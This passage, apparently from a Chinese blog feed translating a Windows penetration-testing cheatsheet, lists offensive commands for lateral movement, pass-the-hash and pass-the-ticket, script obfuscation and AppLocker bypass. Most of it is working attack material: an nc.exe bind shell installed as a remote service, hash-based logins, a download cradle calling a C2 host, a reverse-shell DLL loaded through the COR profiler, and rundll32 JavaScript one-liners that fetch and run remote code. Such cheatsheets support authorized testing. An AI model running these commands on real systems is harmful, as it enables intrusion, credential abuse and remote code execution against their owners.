System.Management.Automation.PSCredential(&apos;WS02\USER&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">$Session = New-PSSession -ComputerName FileServer -Credential $cred</span><br><span class="line">Enter-PSSession $Session</span><br></pre></td></tr></table></figure><h2 id="7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><a href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）" class="headerlink" title="7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）"></a>7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.15 [password] /u:DOMAIN\m0chan</span><br><span class="line"></span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;</span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;</span><br><span class="line">sc \\192.168.0.15 start &lt;service_name&gt;</span><br></pre></td></tr></table></figure><h2 id="7-16-Pass-The-Hash"><a href="#7-16-Pass-The-Hash" class="headerlink" title="7.16 Pass-The-Hash"></a>7.16 Pass-The-Hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;</span><br><span class="line"></span><br><span class="line">pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolution</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</span><br></pre></td></tr></table></figure><h2 id="7-17-Pass-The-Ticket"><a href="#7-17-Pass-The-Ticket" class="headerlink" title="7.17 Pass-The-Ticket"></a>7.17 Pass-The-Ticket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line"></span><br><span class="line">Rebeus monitor /interval:30 </span><br><span class="line"></span><br><span class="line">Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets</span><br><span class="line"></span><br><span class="line">Reubus will now give you a Kerberos ticket in base64 which you can pass with</span><br><span class="line"></span><br><span class="line">Rubeus.exe ptt /ticket:[base64blobhere]</span><br><span class="line"></span><br><span class="line">We can now request TGS service tickets to access network resources as this user</span><br></pre></td></tr></table></figure><h1 id="0x08-混淆-规避技术"><a href="#0x08-混淆-规避技术" class="headerlink" title="0x08 混淆/规避技术"></a>0x08 混淆/规避技术</h1><h2 id="8-1-调用混淆"><a href="#8-1-调用混淆" class="headerlink" title="8.1 调用混淆"></a>8.1 调用混淆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line"></span><br><span class="line">Can obfusacte Scripts &amp; Commands </span><br><span class="line"></span><br><span class="line">Obfusacte script from remote url </span><br><span class="line"></span><br><span class="line">SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1</span><br><span class="line"></span><br><span class="line">Can also set Sscript block base64 PS</span><br><span class="line"></span><br><span class="line">SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==</span><br></pre></td></tr></table></figure><h2 id="8-2-调用-CradleCraft"><a href="#8-2-调用-CradleCraft" class="headerlink" title="8.2 调用-CradleCraft"></a>8.2 调用-CradleCraft</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter</span><br><span class="line"></span><br><span class="line">Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://c2server.com/Invoke-Mimikatz.ps1&apos;)</span><br></pre></td></tr></table></figure><h2 id="8-3-调用DOSfuscation"><a href="#8-3-调用DOSfuscation" class="headerlink" title="8.3 调用DOSfuscation"></a>8.3 调用DOSfuscation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-DOSfuscation</span><br></pre></td></tr></table></figure><h2 id="8-4-Unicorn"><a href="#8-4-Unicorn" class="headerlink" title="8.4 Unicorn"></a>8.4 Unicorn</h2><blockquote><p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicorn.py Nishang.ps1</span><br></pre></td></tr></table></figure><h1 id="0x09-AppLocker-约束模式绕过"><a href="#0x09-AppLocker-约束模式绕过" class="headerlink" title="0x09 AppLocker /约束模式绕过"></a>0x09 AppLocker /约束模式绕过</h1><h2 id="9-1-验证您是否处于受限模式"><a href="#9-1-验证您是否处于受限模式" class="headerlink" title="9.1 验证您是否处于受限模式"></a>9.1 验证您是否处于受限模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure><h2 id="9-2-Powershell非常少旁路"><a href="#9-2-Powershell非常少旁路" class="headerlink" title="9.2 Powershell非常少旁路"></a>9.2 Powershell非常少旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/decoder-it/powershellveryless.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll </span><br><span class="line">/out:C:\Users\m0chan\Scripts\powershellveryless.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Execute -&gt; powershellveryless.exe script.ps1</span><br><span class="line"></span><br><span class="line">script.ps1 = Script of your Choice</span><br></pre></td></tr></table></figure><h2 id="9-3-世界可写文件夹（在Windows-10-1803上为默认）"><a href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）" class="headerlink" title="9.3 世界可写文件夹（在Windows 10 1803上为默认）"></a>9.3 世界可写文件夹（在Windows 10 1803上为默认）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</span><br><span class="line"></span><br><span class="line">C:\Windows\Tasks </span><br><span class="line">C:\Windows\Temp </span><br><span class="line">C:\windows\tracing</span><br><span class="line">C:\Windows\Registration\CRMLog</span><br><span class="line">C:\Windows\System32\FxsTmp</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\PRINTERS</span><br><span class="line">C:\Windows\System32\spool\SERVERS</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\FxsTmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</span><br></pre></td></tr></table></figure><h2 id="9-4-降级攻击"><a href="#9-4-降级攻击" class="headerlink" title="9.4 降级攻击"></a>9.4 降级攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Downgrading to PS Version 2 circumvates Constrained Mode</span><br><span class="line"></span><br><span class="line">powershell.exe -version 2</span><br><span class="line"></span><br><span class="line">Verifiy versions with $PSVersionTable</span><br><span class="line">Get-Host</span><br></pre></td></tr></table></figure><h2 id="9-5-AppLocker-COR配置文件绕过"><a href="#9-5-AppLocker-COR配置文件绕过" class="headerlink" title="9.5 AppLocker COR配置文件绕过"></a>9.5 AppLocker COR配置文件绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;</span><br><span class="line">set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll</span><br><span class="line">tzsync</span><br><span class="line">powershell</span><br><span class="line"></span><br><span class="line">Where .DLL is your payload i/e reverse shell, beacon etc.</span><br></pre></td></tr></table></figure><h2 id="9-6-MSBuild-Powershell-CMD旁路"><a href="#9-6-MSBuild-Powershell-CMD旁路" class="headerlink" title="9.6 MSBuild Powershell / CMD旁路"></a>9.6 MSBuild Powershell / CMD旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You can use this if cmd is not disabled but powershell is</span><br><span class="line"></span><br><span class="line">https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj</span><br><span class="line"></span><br><span class="line">Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c</span><br><span class="line"></span><br><span class="line">MSBuild PSAttack :D :D</span><br></pre></td></tr></table></figure><h2 id="9-7-PSAttack"><a href="#9-7-PSAttack" class="headerlink" title="9.7 PSAttack"></a>9.7 PSAttack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jaredhaight/PSAttack</span><br><span class="line"></span><br><span class="line">Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.</span><br><span class="line"></span><br><span class="line">Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)</span><br></pre></td></tr></table></figure><h2 id="9-8-NoPowerShell"><a href="#9-8-NoPowerShell" class="headerlink" title="9.8 NoPowerShell"></a>9.8 NoPowerShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/bitsadmin/nopowershell</span><br><span class="line"></span><br><span class="line">Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.</span><br></pre></td></tr></table></figure><h2 id="9-9-runDLL32绕过"><a href="#9-9-runDLL32绕过" class="headerlink" title="9.9 runDLL32绕过"></a>9.9 runDLL32绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</span><br><span class="line"></span><br><span class="line">rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exe</span><br><span class="line"></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL payload.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new%20ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href=&quot;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="主机安全" scheme="https://www.mad-coding.cn/categories/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="翻译文章" scheme="https://www.mad-coding.cn/tags/%E7%BF%BB%E8%AF%91%E6%96%87%E7%AB%A0/"/>
    
      <category term="Windows" scheme="https://www.mad-coding.cn/tags/Windows/"/>
    
  </entry>
  
</feed>
